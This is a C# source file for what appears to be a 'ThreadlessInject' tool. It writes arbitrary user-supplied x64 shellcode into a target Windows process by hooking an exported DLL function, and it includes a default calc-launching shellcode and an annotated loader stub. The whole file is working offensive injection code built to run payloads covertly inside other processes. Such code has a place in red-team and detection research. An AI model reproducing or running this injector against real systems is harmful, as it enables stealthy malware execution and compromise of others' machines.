using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;

using Mono.Options;

namespace ThreadlessInject;

using static Native;
using static Win32;

internal static class Program
{
    //x64 calc shellcode function with ret as default if no shellcode supplied
    private static readonly byte[] CalcX64 =
    {
        0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
        0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
        0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
        0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
        0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
        0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
        0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
        0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
        0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
    };

    private static readonly byte[] ShellcodeLoader =
    {
        0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
        0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
        0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
        0xE0, 0x90
    };
    
    private static IntPtr GetModuleHandle(string dll)
    {
        using var self = Process.GetCurrentProcess();
        
        foreach (ProcessModule module in self.Modules)
        {
            if (!module.ModuleName.Equals(dll, StringComparison.OrdinalIgnoreCase))
                continue;

            return module.BaseAddress;
        }
        
        return IntPtr.Zero;
    }

    private static void GenerateHook(long originalInstructions)
    {
        // This function generates the following shellcode.
        // The hooked function export is determined by immediately popping the return address and subtracting by 5 (size of relative call instruction)
        // Original function arguments are pushed onto the stack to restore after the injected shellcode is executed
        // The hooked function bytes are restored to the original values (essentially a one time hook)
        // A relative function call is made to the injected shellcode that will follow immediately after the stub
        // Original function arguments are popped off the stack and restored to the correct registers
        // A jmp back to the original unpatched export restoring program behavior as normal
        // 
        // This shellcode loader stub assumes that the injector has left the hooked function RWX to enable restoration,
        // the injector can then monitor for when the restoration has occured to restore the memory back to RX

        /*
          start:
            0:  58                      pop    rax
            1:  48 83 e8 05             sub    rax,0x5
            5:  50                      push   rax
            6:  51                      push   rcx
            7:  52                      push   rdx
            8:  41 50                   push   r8
            a:  41 51                   push   r9
            c:  41 52                   push   r10
            e:  41 53                   push   r11
            10: 48 b9 88 77 66 55 44    movabs rcx,0x1122334455667788
            17: 33 22 11
            1a: 48 89 08                mov    QWORD PTR [rax],rcx
            1d: 48 83 ec 40             sub    rsp,0x40
            21: e8 11 00 00 00          call   shellcode
            26: 48 83 c4 40             add    rsp,0x40
            2a: 41 5b                   pop    r11
            2c: 41 5a                   pop    r10
            2e: 41 59                   pop    r9
            30: 41 58                   pop    r8
            32: 5a                      pop    rdx
            33: 59                      pop    rcx
            34: 58                      pop    rax
            35: ff e0                   jmp    rax
          shellcode:
        */

        using var writer = new BinaryWriter(new MemoryStream(ShellcodeLoader));
        //Write the original 8 bytes that were in the original export prior to hooking
        writer.Seek(0x12, SeekOrigin.Begin);
        writer.Write(originalInstructions);
        writer.Flush();
    }

    private static ulong FindMemoryHole(IntPtr hProcess, ulong exportAddress, int size)
    {
        ulong remoteLoaderAddress;
        var foundMemory = false;

        for (remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
             remoteLoaderAddress < exportAddress + 0x70000000;
             remoteLoaderAddress += 0x10000)
        {
            var status = AllocateVirtualMemory(hProcess, remoteLoaderAddress, size);
            if (status != NTSTATUS.Success)
                continue;

            foundMemory = true;
            break;
        }

        return foundMemory ? remoteLoaderAddress : 0;
    }

    private static byte[] ReadPayload(string path)
    {
        if (File.Exists(path))
        {
            return File.ReadAllBytes(path);
        }

        Console.WriteLine("[=] Shellcode argument doesn't appear to be a file, assuming Base64");
        return Convert.FromBase64String(path);
    }

    private static byte[] LoadShellcode(string path)
    {
        byte[] shellcode;

        if (path == null)
        {
            Console.WriteLine("[=] No shellcode supplied, using calc shellcode");
            shellcode = CalcX64;
        }
        else
        {
            shellcode = ReadPayload(path);
        }

        return shellcode;
    }

    public static void Main(string[] args)
    {
        var showHelp = false;
        string shellcodeStr = null;
        string dll = null;
        string export = null;
        var pid = 0;

        var optionSet = new OptionSet()
            .Add("h|help", "Display this help", v => showHelp = v != null)
            .Add("x=|shellcode=", "Path/Base64 for x64 shellcode payload (default: calc launcher)",
                v => shellcodeStr = v)
            .Add<int>("p=|pid=", @"Target process ID to inject", v => pid = v)
            .Add("d=|dll=", "The DLL that that contains the export to patch (must be KnownDll)", v => dll = v)
            .Add("e=|export=", "The exported function that will be hijacked", v => export = v);

        try
        {
            optionSet.Parse(args);

            if (dll == null || pid == 0 || export == null)
            {
                Console.WriteLine("[!] pid, dll and export arguments are required");
                showHelp = true;
            }

            if (showHelp)
            {
                optionSet.WriteOptionDescriptions(Console.Out);
                return;
            }

        }
        catch (Exception e)
        {
            Console.WriteLine($"[!] Failed to parse arguments: {e.Message}");
            optionSet.WriteOptionDescriptions(Console.Out);
            return;
        }

        var hModule = GetModuleHandle(dll);

        if (hModule == IntPtr.Zero)
            hModule = LoadLibrary(dll);

        if (hModule == IntPtr.Zero)
        {
            Console.WriteLine($"[!] Failed to open handle to DLL {dll}, is the KnownDll loaded?");
            return;
        }

        var exportAddress = GetProcAddress(hModule, export);
        if (exportAddress == IntPtr.Zero)
        {
            Console.WriteLine($"[!] Failed to find export {export} in {dll}, are you sure it's correct?");
            return;
        }

        Console.WriteLine($"[=] Found {dll}!{export} @ 0x{exportAddress.ToInt64():x}");

        var status = OpenProcess(pid, out var hProcess);
        if (status != 0 || hProcess == IntPtr.Zero)
        {
            Console.WriteLine($"[!] Failed to open PID {pid}: {status}.");
            return;
        }

        Console.WriteLine($"[=] Opened process with id {pid}");

        var shellcode = LoadShellcode(shellcodeStr);
        
        var loaderAddress = FindMemoryHole(
            hProcess,
            (ulong)exportAddress,
            ShellcodeLoader.Length + shellcode.Length);

        if (loaderAddress == 0)
        {
            Console.WriteLine("[!] Failed to find a memory hole with 2G of export address, bailing");
            return;
        }

        Console.WriteLine($"[=] Allocated loader and shellcode at 0x{loaderAddress:x} within PID {pid}");

        var originalBytes = Marshal.ReadInt64(exportAddress);
        GenerateHook(originalBytes);

        ProtectVirtualMemory(
            hProcess,
            exportAddress,
            8,
            MemoryProtection.ExecuteReadWrite,
            out var oldProtect);

        var relativeLoaderAddress = (int)(loaderAddress - ((ulong)exportAddress + 5));
        var callOpCode = new byte[] { 0xe8, 0, 0, 0, 0 };

        using var ms = new MemoryStream(callOpCode);
        using var br = new BinaryWriter(ms);
        br.Seek(1, SeekOrigin.Begin);
        br.Write(relativeLoaderAddress);

        status = WriteVirtualMemory(
            hProcess,
            exportAddress,
            callOpCode,
            out var bytesWritten);

        if (status != NTSTATUS.Success || (int)bytesWritten != callOpCode.Length)
        {
            Console.WriteLine($"[!] Failed to write callOpCode: {status}");
            return;
        }

        var payload = ShellcodeLoader.Concat(shellcode).ToArray();
        //WriteProcessMemory(hProcess, (IntPtr)loaderAddress, payload, payload.Length, out _);

        status = ProtectVirtualMemory(
            hProcess,
            (IntPtr)loaderAddress,
            (uint)payload.Length,
            MemoryProtection.ReadWrite,
            out oldProtect);

        if (status != NTSTATUS.Success)
        {
            Console.WriteLine($"[!] Failed to unprotect 0x{loaderAddress:x}");
            return;
        }

        status = WriteVirtualMemory(
            hProcess,
            (IntPtr)loaderAddress,
            payload,
            out bytesWritten);
        
        if (status != NTSTATUS.Success || (int)bytesWritten != payload.Length)
        {
            Console.WriteLine($"[!] Failed to write payload: {status}");
            return;
        }
        
        status = ProtectVirtualMemory(
            hProcess,
            (IntPtr)loaderAddress,
            (uint)payload.Length,
            oldProtect,
            out _);
        
        if (status != NTSTATUS.Success)
        {
            Console.WriteLine($"[!] Failed to protect 0x{loaderAddress:x}");
            return;
        }

        var timer = new Stopwatch();
        timer.Start();
        var executed = false;

        Console.WriteLine("[+] Shellcode injected, Waiting 60s for the hook to be called");

        while (timer.Elapsed.TotalSeconds < 60)
        {
            var bytesToRead = 8;
            var buf = Marshal.AllocHGlobal(bytesToRead);
            
            ReadVirtualMemory(
                hProcess,
                exportAddress,
                buf,
                (uint)bytesToRead,
                out var bytesRead);

            var temp = new byte[bytesRead];
            Marshal.Copy(buf, temp, 0, bytesToRead);
            var currentBytes = BitConverter.ToInt64(temp, 0);

            if (originalBytes == currentBytes)
            {
                executed = true;
                break;
            }

            Thread.Sleep(1000);
        }

        timer.Stop();

        if (executed)
        {
            ProtectVirtualMemory(
                hProcess,
                exportAddress,
                8,
                oldProtect,
                out _);

            FreeVirtualMemory(
                hProcess,
                (IntPtr)loaderAddress);

            Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s, export restored");
        }
        else
        {
            Console.WriteLine("[!] Shellcode did not trigger within 60s, it may still execute but we are not cleaning up");
        }

        CloseHandle(hProcess);
    }
}